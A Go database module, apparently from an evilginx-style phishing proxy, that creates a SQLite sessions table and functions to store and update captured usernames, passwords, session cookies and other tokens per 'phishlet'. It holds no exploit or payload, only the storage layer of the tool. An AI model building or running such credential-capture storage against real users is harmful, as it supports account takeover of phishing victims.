package database

import (
	"database/sql"
	"encoding/json"
	"fmt"
	"time"
)

type Session struct {
	Id           int                                `json:"id"`
	Phishlet     string                             `json:"phishlet"`
	LandingURL   string                             `json:"landing_url"`
	Username     string                             `json:"username"`
	Password     string                             `json:"password"`
	Custom       map[string]string                  `json:"custom"`
	BodyTokens   map[string]string                  `json:"body_tokens"`
	HttpTokens   map[string]string                  `json:"http_tokens"`
	CookieTokens map[string]map[string]*CookieToken `json:"tokens"`
	SessionId    string                             `json:"session_id"`
	UserAgent    string                             `json:"useragent"`
	RemoteAddr   string                             `json:"remote_addr"`
	CreateTime   int64                              `json:"create_time"`
	UpdateTime   int64                              `json:"update_time"`
}

type CookieToken struct {
	Name     string
	Value    string
	Path     string
	HttpOnly bool
}

const createSessionsTable = `
CREATE TABLE IF NOT EXISTS sessions (
    id            INTEGER PRIMARY KEY AUTOINCREMENT,
    session_id    TEXT UNIQUE NOT NULL,
    phishlet      TEXT NOT NULL DEFAULT '',
    landing_url   TEXT NOT NULL DEFAULT '',
    username      TEXT NOT NULL DEFAULT '',
    password      TEXT NOT NULL DEFAULT '',
    custom        TEXT NOT NULL DEFAULT '{}',
    body_tokens   TEXT NOT NULL DEFAULT '{}',
    http_tokens   TEXT NOT NULL DEFAULT '{}',
    cookie_tokens TEXT NOT NULL DEFAULT '{}',
    useragent     TEXT NOT NULL DEFAULT '',
    remote_addr   TEXT NOT NULL DEFAULT '',
    create_time   INTEGER NOT NULL DEFAULT 0,
    update_time   INTEGER NOT NULL DEFAULT 0
)`

func (d *Database) sessionsInit() error {
	_, err := d.db.Exec(createSessionsTable)
	return err
}

func scanSession(scanner interface{ Scan(dest ...interface{}) error }) (*Session, error) {
	s := &Session{}
	var customJSON, bodyJSON, httpJSON, cookieJSON string

	err := scanner.Scan(
		&s.Id,
		&s.SessionId,
		&s.Phishlet,
		&s.LandingURL,
		&s.Username,
		&s.Password,
		&customJSON,
		&bodyJSON,
		&httpJSON,
		&cookieJSON,
		&s.UserAgent,
		&s.RemoteAddr,
		&s.CreateTime,
		&s.UpdateTime,
	)
	if err != nil {
		return nil, err
	}

	s.Custom = make(map[string]string)
	s.BodyTokens = make(map[string]string)
	s.HttpTokens = make(map[string]string)
	s.CookieTokens = make(map[string]map[string]*CookieToken)

	json.Unmarshal([]byte(customJSON), &s.Custom)
	json.Unmarshal([]byte(bodyJSON), &s.BodyTokens)
	json.Unmarshal([]byte(httpJSON), &s.HttpTokens)
	json.Unmarshal([]byte(cookieJSON), &s.CookieTokens)

	return s, nil
}

const sessionColumns = `id, session_id, phishlet, landing_url, username, password, custom, body_tokens, http_tokens, cookie_tokens, useragent, remote_addr, create_time, update_time`

func (d *Database) sessionsCreate(sid string, phishlet string, landing_url string, useragent string, remote_addr string) (*Session, error) {
	now := time.Now().UTC().Unix()
	customJSON, _ := json.Marshal(make(map[string]string))
	bodyJSON, _ := json.Marshal(make(map[string]string))
	httpJSON, _ := json.Marshal(make(map[string]string))
	cookieJSON, _ := json.Marshal(make(map[string]map[string]*CookieToken))

	result, err := d.db.Exec(
		`INSERT INTO sessions (session_id, phishlet, landing_url, username, password, custom, body_tokens, http_tokens, cookie_tokens, useragent, remote_addr, create_time, update_time)
		 VALUES (?, ?, ?, '', '', ?, ?, ?, ?, ?, ?, ?, ?)`,
		sid, phishlet, landing_url, string(customJSON), string(bodyJSON), string(httpJSON), string(cookieJSON), useragent, remote_addr, now, now,
	)
	if err != nil {
		return nil, fmt.Errorf("session already exists: %s", sid)
	}

	id, _ := result.LastInsertId()

	s := &Session{
		Id:           int(id),
		Phishlet:     phishlet,
		LandingURL:   landing_url,
		Username:     "",
		Password:     "",
		Custom:       make(map[string]string),
		BodyTokens:   make(map[string]string),
		HttpTokens:   make(map[string]string),
		CookieTokens: make(map[string]map[string]*CookieToken),
		SessionId:    sid,
		UserAgent:    useragent,
		RemoteAddr:   remote_addr,
		CreateTime:   now,
		UpdateTime:   now,
	}

	return s, nil
}

func (d *Database) sessionsList() ([]*Session, error) {
	rows, err := d.db.Query(`SELECT ` + sessionColumns + ` FROM sessions ORDER BY id ASC`)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var sessions []*Session
	for rows.Next() {
		s, err := scanSession(rows)
		if err != nil {
			return nil, err
		}
		sessions = append(sessions, s)
	}
	if sessions == nil {
		sessions = []*Session{}
	}
	return sessions, rows.Err()
}

func (d *Database) sessionsGetBySid(sid string) (*Session, error) {
	row := d.db.QueryRow(`SELECT `+sessionColumns+` FROM sessions WHERE session_id = ?`, sid)
	s, err := scanSession(row)
	if err == sql.ErrNoRows {
		return nil, fmt.Errorf("session not found: %s", sid)
	}
	return s, err
}

func (d *Database) sessionsGetById(id int) (*Session, error) {
	row := d.db.QueryRow(`SELECT `+sessionColumns+` FROM sessions WHERE id = ?`, id)
	s, err := scanSession(row)
	if err == sql.ErrNoRows {
		return nil, fmt.Errorf("session ID not found: %d", id)
	}
	return s, err
}

func (d *Database) sessionsUpdateUsername(sid string, username string) error {
	now := time.Now().UTC().Unix()
	res, err := d.db.Exec(`UPDATE sessions SET username = ?, update_time = ? WHERE session_id = ?`, username, now, sid)
	if err != nil {
		return err
	}
	n, _ := res.RowsAffected()
	if n == 0 {
		return fmt.Errorf("session not found: %s", sid)
	}
	return nil
}

func (d *Database) sessionsUpdatePassword(sid string, password string) error {
	now := time.Now().UTC().Unix()
	res, err := d.db.Exec(`UPDATE sessions SET password = ?, update_time = ? WHERE session_id = ?`, password, now, sid)
	if err != nil {
		return err
	}
	n, _ := res.RowsAffected()
	if n == 0 {
		return fmt.Errorf("session not found: %s", sid)
	}
	return nil
}

func (d *Database) sessionsUpdateCustom(sid string, name string, value string) error {
	s, err := d.sessionsGetBySid(sid)
	if err != nil {
		return err
	}
	s.Custom[name] = value
	customJSON, _ := json.Marshal(s.Custom)
	now := time.Now().UTC().Unix()
	_, err = d.db.Exec(`UPDATE sessions SET custom = ?, update_time = ? WHERE session_id = ?`, string(customJSON), now, sid)
	return err
}

func (d *Database) sessionsUpdateBodyTokens(sid string, tokens map[string]string) error {
	now := time.Now().UTC().Unix()
	tokensJSON, _ := json.Marshal(tokens)
	res, err := d.db.Exec(`UPDATE sessions SET body_tokens = ?, update_time = ? WHERE session_id = ?`, string(tokensJSON), now, sid)
	if err != nil {
		return err
	}
	n, _ := res.RowsAffected()
	if n == 0 {
		return fmt.Errorf("session not found: %s", sid)
	}
	return nil
}

func (d *Database) sessionsUpdateHttpTokens(sid string, tokens map[string]string) error {
	now := time.Now().UTC().Unix()
	tokensJSON, _ := json.Marshal(tokens)
	res, err := d.db.Exec(`UPDATE sessions SET http_tokens = ?, update_time = ? WHERE session_id = ?`, string(tokensJSON), now, sid)
	if err != nil {
		return err
	}
	n, _ := res.RowsAffected()
	if n == 0 {
		return fmt.Errorf("session not found: %s", sid)
	}
	return nil
}

func (d *Database) sessionsUpdateCookieTokens(sid string, tokens map[string]map[string]*CookieToken) error {
	now := time.Now().UTC().Unix()
	tokensJSON, _ := json.Marshal(tokens)
	res, err := d.db.Exec(`UPDATE sessions SET cookie_tokens = ?, update_time = ? WHERE session_id = ?`, string(tokensJSON), now, sid)
	if err != nil {
		return err
	}
	n, _ := res.RowsAffected()
	if n == 0 {
		return fmt.Errorf("session not found: %s", sid)
	}
	return nil
}

func (d *Database) sessionsDelete(id int) error {
	res, err := d.db.Exec(`DELETE FROM sessions WHERE id = ?`, id)
	if err != nil {
		return err
	}
	n, _ := res.RowsAffected()
	if n == 0 {
		return fmt.Errorf("session ID not found: %d", id)
	}
	return nil
}
